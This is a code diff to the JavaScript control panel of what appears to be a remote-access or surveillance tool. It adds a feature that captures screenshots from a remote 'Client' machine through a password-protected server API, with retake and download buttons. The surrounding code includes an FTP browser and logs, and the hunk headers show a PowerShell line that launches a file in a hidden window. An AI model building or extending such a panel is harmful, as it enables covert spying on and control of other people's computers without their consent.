@@ -712,7 +712,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             updateOptionsUI();
             fetchData();
         } catch {
-            alert('Failed to toggle screenshot capture.');
+            alert('Failed to toggle screenshot stream.');
         } finally {
             if (btn) {
                 btn.style.pointerEvents = '';
@@ -757,6 +757,177 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                 btn.style.opacity = '';
             }
         }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // SCREENSHOT CAPTURE PREVIEW MODULE
+    // ═══════════════════════════════════════════════════════════════
+
+    const screenshotModalState = {
+        isOpen: false,
+        user: null,
+        data: null
+    };
+
+    function openScreenshotModal(user) {
+        if (!user) return;
+        screenshotModalState.isOpen = true;
+        screenshotModalState.user = user;
+        screenshotModalState.data = null;
+
+        const modal = $('screenshot-modal');
+        if (!modal) return;
+
+        const targetEl = $('screenshot-target-user');
+        if (targetEl) targetEl.textContent = `Client: ${getDisplayUsername(user.username)}`;
+
+        const loading = $('screenshot-loading');
+        const loadingText = $('screenshot-loading-text');
+        const imgWrap = $('screenshot-img-wrap');
+        const metaBar = $('screenshot-meta-bar');
+        const img = $('screenshot-preview-img');
+
+        if (loading) loading.style.display = 'flex';
+        if (loadingText) loadingText.textContent = `Capturing screenshot from ${getDisplayUsername(user.username)}...`;
+        if (imgWrap) imgWrap.style.display = 'none';
+        if (metaBar) metaBar.style.display = 'none';
+        if (img) img.src = '';
+
+        modal.style.display = 'flex';
+    }
+
+    function closeScreenshotModal() {
+        screenshotModalState.isOpen = false;
+        const modal = $('screenshot-modal');
+        if (modal) modal.style.display = 'none';
+    }
+
+    function renderScreenshotPreview(data) {
+        screenshotModalState.data = data;
+        const img = $('screenshot-preview-img');
+        const imgWrap = $('screenshot-img-wrap');
+        const loading = $('screenshot-loading');
+        const metaBar = $('screenshot-meta-bar');
+
+        if (!img || !imgWrap) return;
+
+        img.onload = () => {
+            if (loading) loading.style.display = 'none';
+            if (imgWrap) imgWrap.style.display = 'flex';
+            if (metaBar) metaBar.style.display = 'flex';
+        };
+
+        img.onerror = () => {
+            if (loading) loading.style.display = 'none';
+            alert('Failed to render captured frame.');
+            closeScreenshotModal();
+        };
+
+        img.src = data.url;
+
+        const fileLabel = $('screenshot-filename-label');
+        const timeLabel = $('screenshot-time-label');
+        if (fileLabel) fileLabel.textContent = data.filename || 'screenshot.jpg';
+        if (timeLabel) timeLabel.textContent = data.isDemo ? 'Demo simulation' : `Captured ${new Date().toLocaleTimeString()}`;
+    }
+
+    async function doTakeSingleScreenshot() {
+        if (isSendingCommand) return;
+        const user = runState.popupUser;
+        if (!user) return;
+
+        const btn = $('single-screenshot-btn');
+        if (btn) {
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.6';
+        }
+
+        openScreenshotModal(user);
+
+        if (!runState.isConnected || user.demo) {
+            // Demo mode simulation
+            setTimeout(() => {
+                if (btn) {
+                    btn.style.pointerEvents = '';
+                    btn.style.opacity = '';
+                }
+                const demoTimestamp = new Date().toISOString().replace(/\D/g, '').substring(0, 17);
+                const mockFilename = `${demoTimestamp}.jpg`;
+                renderScreenshotPreview({
+                    username: user.username,
+                    filename: mockFilename,
+                    url: 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?auto=format&fit=crop&w=1200&q=80',
+                    isDemo: true
+                });
+            }, 900);
+            return;
+        }
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/screenshot/take`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                body: JSON.stringify({ username: user.username })
+            });
+
+            if (!res.ok) {
+                const errData = await res.json().catch(() => ({}));
+                throw new Error(errData.message || 'Failed to capture screenshot');
+            }
+
+            const data = await res.json();
+            renderScreenshotPreview(data);
+        } catch (err) {
+            const loading = $('screenshot-loading');
+            if (loading) loading.style.display = 'none';
+            alert(err.message || 'Failed to capture screenshot.');
+            closeScreenshotModal();
+        } finally {
+            if (btn) {
+                btn.style.pointerEvents = '';
+                btn.style.opacity = '';
+            }
+        }
+    }
+
+    function initScreenshotModal() {
+        $('screenshot-close-btn')?.addEventListener('click', closeScreenshotModal);
+
+        $('screenshot-retake-btn')?.addEventListener('click', () => {
+            if (screenshotModalState.user) {
+                doTakeSingleScreenshot();
+            }
+        });
+
+        $('screenshot-open-frames-btn')?.addEventListener('click', () => {
+            const targetUser = screenshotModalState.user?.username || screenshotModalState.data?.username;
+            if (targetUser) {
+                closeScreenshotModal();
+                closePopup();
+                const cur = window.__getCurrentMode ? window.__getCurrentMode() : 'run';
+                if (cur !== 'frames') {
+                    $('brandToggle')?.click();
+                }
+                if (typeof FramesApp !== 'undefined') {
+                    FramesApp.loadFolder(targetUser);
+                }
+            }
+        });
+
+        $('screenshot-download-btn')?.addEventListener('click', () => {
+            const data = screenshotModalState.data;
+            if (!data?.url) return;
+            const a = document.createElement('a');
+            a.href = data.url;
+            a.download = data.filename || 'screenshot.jpg';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+
+        $('screenshot-modal')?.addEventListener('click', e => {
+            if (e.target === $('screenshot-modal')) closeScreenshotModal();
+        });
     }
 
     // ═══════════════════════════════════════════════════════════════
@@ -2434,10 +2605,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         $('user-logs-btn')?.addEventListener('click', () => {
             if (runState.popupUser) openLogsModal(runState.popupUser);
         });
+        $('single-screenshot-btn')?.addEventListener('click', doTakeSingleScreenshot);
         $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
         $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
         initFtpBrowser();
         initLogsModal();
+        initScreenshotModal();
 
         const fileUpload = $('file-upload');
         if (fileUpload) {
@@ -2463,6 +2636,17 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
 
         // Global keyboard shortcuts
         document.addEventListener('keydown', e => {
+            if (screenshotModalState.isOpen) {
+                if (e.key === 'Escape') {
+                    closeScreenshotModal();
+                    return;
+                }
+                if (e.key === 'r' || e.key === 'R') {
+                    e.preventDefault();
+                    doTakeSingleScreenshot();
+                    return;
+                }
+            }
             if (logsState.isOpen) {
                 if (e.key === 'Escape') {
                     closeLogsModal(true);
